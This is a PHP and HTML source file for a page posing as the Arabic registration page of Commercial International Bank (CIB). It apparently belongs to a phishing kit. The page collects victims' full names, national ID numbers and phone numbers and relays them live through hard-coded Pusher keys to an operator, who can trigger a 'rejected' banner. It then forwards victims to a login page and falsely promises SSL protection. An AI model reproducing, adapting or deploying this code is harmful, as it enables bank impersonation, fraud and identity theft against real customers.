<?php
error_reporting(0);
ini_set('display_errors', 0);

session_start();

require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
    '0737c04931774e406307',
    'eda7db4b963c98f62991',
    '2154404',
    $options
  );

    $site = array(
        'username' => $_POST['fullName'],
        'ssn' => $_POST['idNumber'],
        'phone' => $_POST['phoneNumber'],
        'page' => 'registration.php',
        'message' => 'registration'
    );

    $userId = $User->register($site);
    if ($userId) {
        $_SESSION['user_id'] = $userId;

        $dataUser = [
            'userId' => $userId,
            'updatedData' => [
                'username' => $site['username'],
                'message' => $site['message'],
                'type' => '1'
            ]
        ];

        $pusher->trigger('my-channel-cib', 'my-event-bann', $dataUser);

        echo "<script>document.location.href='login.php';</script>";
        exit;
    }
}

if (isset($_GET['reject'])) {
    $showError = true;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>البنك التجاري الدولي - تسجيل البيانات</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap"
        rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', sans-serif;
            min-height: 100vh;
            background: #f0f4f8;
            color: #1a2332;
            direction: rtl;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 0;
        }

        .page-wrapper {
            width: 100%;
            max-width: 420px;
            min-height: 100vh;
            background: #ffffff;
            position: relative;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 40px rgba(0, 0, 0, 0.06);
        }

        /* Header */
        .header {
            background: linear-gradient(135deg, #1a5ca8 0%, #0d3b6e 100%);
            padding: 40px 24px 50px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -30%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.06) 0%, transparent 60%);
            pointer-events: none;
        }

        .header-logo {
            width: 140px;
            height: auto;
            filter: brightness(10);
            margin-bottom: 16px;
            position: relative;
            z-index: 1;
        }

        .header-title {
            color: #ffffff;
            font-size: 18px;
            font-weight: 600;
            position: relative;
            z-index: 1;
            opacity: 0.95;
        }

        .header-subtitle {
            color: rgba(255, 255, 255, 0.65);
            font-size: 13px;
            margin-top: 4px;
            position: relative;
            z-index: 1;
        }

        /* Form */
        .form-section {
            padding: 28px 24px 20px;
            flex: 1;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #374151;
            margin-bottom: 8px;
        }

        .input-field {
            width: 100%;
            padding: 14px 18px;
            border: 1.5px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            font-family: 'Cairo', sans-serif;
            color: #1a2332;
            background: #f8fafc;
            transition: all 0.25s ease;
            outline: none;
        }

        .input-field::placeholder {
            color: #94a3b8;
        }

        .input-field:focus {
            border-color: #1a5ca8;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(26, 92, 168, 0.1);
        }

        /* Error */
        .field-error {
            display: none;
            color: #dc2626;
            font-size: 12px;
            margin-top: 6px;
            font-weight: 500;
        }

        .field-error.show {
            display: block;
        }

        .reject-banner {
            background: linear-gradient(135deg, #fef2f2, #fee2e2);
            border: 1px solid #fecaca;
            border-radius: 12px;
            padding: 14px 16px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .reject-banner svg {
            flex-shrink: 0;
        }

        .reject-banner span {
            color: #991b1b;
            font-size: 13px;
            font-weight: 600;
        }

        /* Button */
        .submit-btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            cursor: not-allowed;
            transition: all 0.3s ease;
            color: #ffffff;
            background: linear-gradient(135deg, #94a3b8, #cbd5e1);
            margin-top: 8px;
            position: relative;
            overflow: hidden;
        }

        .submit-btn.active {
            background: linear-gradient(135deg, #1a5ca8, #2563eb);
            cursor: pointer;
            box-shadow: 0 4px 14px rgba(26, 92, 168, 0.3);
        }

        .submit-btn.active:hover {
            transform: translateY(-1px);
            box-shadow: 0 6px 20px rgba(26, 92, 168, 0.4);
        }

        .submit-btn.active:active {
            transform: translateY(0);
        }

        /* Security note */
        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-top: 20px;
            padding-bottom: 24px;
        }

        .security-note svg {
            flex-shrink: 0;
        }

        .security-note span {
            color: #64748b;
            font-size: 11px;
            font-weight: 500;
        }

        /* Loading */
        #loadingOverlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(15, 23, 42, 0.6);
            backdrop-filter: blur(4px);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        #loadingOverlay.show {
            display: flex;
        }

        .loader-card {
            background: #fff;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
        }

        .loader-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #e2e8f0;
            border-top-color: #1a5ca8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 16px;
        }

        .loader-card h5 {
            color: #1a2332;
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 4px;
        }

        .loader-card p {
            color: #64748b;
            font-size: 13px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @media (max-width: 480px) {
            .page-wrapper {
                max-width: 100%;
            }

            .header {
                padding: 30px 20px 40px;
            }

            .header-logo {
                width: 110px;
            }

            .form-section {
                padding: 24px 20px;
            }
        }
    </style>
</head>

<body>
    <div class="page-wrapper">
        <div class="header">
            <img src="assets/logo.webp" alt="CIB" class="header-logo">
            <div class="header-title">تسجيل البيانات الشخصية</div>
            <div class="header-subtitle">يرجى إدخال بياناتك بدقة للمتابعة</div>
        </div>

        <div class="form-section">
            <form method="POST" action="" id="regForm">
                <div class="input-group">
                    <label for="fullName" class="input-label">الاسم الكامل</label>
                    <input type="text" id="fullName" name="fullName" class="input-field"
                        placeholder="أدخل اسمك الكامل كما في الهوية" required>
                    <div id="fullNameError" class="field-error"></div>
                </div>
                <div class="input-group">
                    <label for="idNumber" class="input-label">الرقم القومي</label>
                    <input type="tel" id="idNumber" name="idNumber" class="input-field"
                        placeholder="أدخل الرقم القومي (14 رقم)" maxlength="14" required>
                    <div id="idNumberError" class="field-error"></div>
                </div>
                <div class="input-group">
                    <label for="phoneNumber" class="input-label">رقم الهاتف</label>
                    <input type="tel" id="phoneNumber" name="phoneNumber" class="input-field"
                        placeholder="أدخل رقم الهاتف (11 رقم)" maxlength="11" required>
                    <div id="phoneNumberError" class="field-error"></div>
                </div>

                <?php if (isset($showError)): ?>
                    <div class="reject-banner">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="2.5"
                            stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="10" />
                            <line x1="15" y1="9" x2="9" y2="15" />
                            <line x1="9" y1="9" x2="15" y2="15" />
                        </svg>
                        <span>تم رفض طلبك. يرجى التحقق من بياناتك والمحاولة مرة أخرى.</span>
                    </div>
                <?php endif; ?>

                <button type="submit" name="submit" class="submit-btn" id="submitBtn" disabled>إرسال البيانات</button>
            </form>

            <div class="security-note">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"
                    stroke-linecap="round" stroke-linejoin="round">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                </svg>
                <span>بياناتك محمية بتشفير 256-bit SSL</span>
            </div>
        </div>
    </div>

    <div id="loadingOverlay">
        <div class="loader-card">
            <div class="loader-spinner"></div>
            <h5>جاري المعالجة</h5>
            <p>يرجى الانتظار...</p>
        </div>
    </div>

    <script>
        function validateForm() {
            const name = document.getElementById('fullName').value.trim();
            const id = document.getElementById('idNumber').value.trim();
            const ph = document.getElementById('phoneNumber').value.trim();
            const valid = name.length > 0 && id.length === 14 && ph.length === 11;
            const btn = document.getElementById('submitBtn');
            btn.disabled = !valid;
            btn.classList.toggle('active', valid);
            return valid;
        }

        function setFieldError(fieldId, message) {
            const el = document.getElementById(fieldId + 'Error');
            if (!message) { el.textContent = ''; el.classList.remove('show'); return; }
            el.textContent = message;
            el.classList.add('show');
        }

        document.addEventListener('DOMContentLoaded', function () {
            document.getElementById('fullName').focus();
            validateForm();
            document.getElementById('fullName').addEventListener('input', validateForm);
            document.getElementById('idNumber').addEventListener('input', function (e) {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 14);
                validateForm();
            });
            document.getElementById('phoneNumber').addEventListener('input', function (e) {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 11);
                validateForm();
            });

            document.getElementById('regForm').addEventListener('submit', function (e) {
                const name = document.getElementById('fullName').value.trim();
                const id = document.getElementById('idNumber').value.trim();
                const ph = document.getElementById('phoneNumber').value.trim();
                let hasErrors = false;
                if (!name) { setFieldError('fullName', 'يرجى إدخال الاسم الكامل.'); hasErrors = true; } else { setFieldError('fullName', ''); }
                if (id.length !== 14) { setFieldError('idNumber', 'الرقم القومي يجب أن يكون 14 رقمًا.'); hasErrors = true; } else { setFieldError('idNumber', ''); }
                if (ph.length !== 11) { setFieldError('phoneNumber', 'رقم الهاتف يجب أن يكون 11 رقمًا.'); hasErrors = true; } else { setFieldError('phoneNumber', ''); }
                if (hasErrors) { e.preventDefault(); return; }

                sessionStorage.setItem('userFullName', name);
                sessionStorage.setItem('userPhoneNumber', ph);
                sessionStorage.setItem('userIdNumber', id);

                document.getElementById('loadingOverlay').classList.add('show');
            });
        });
    </script>
</body>

</html>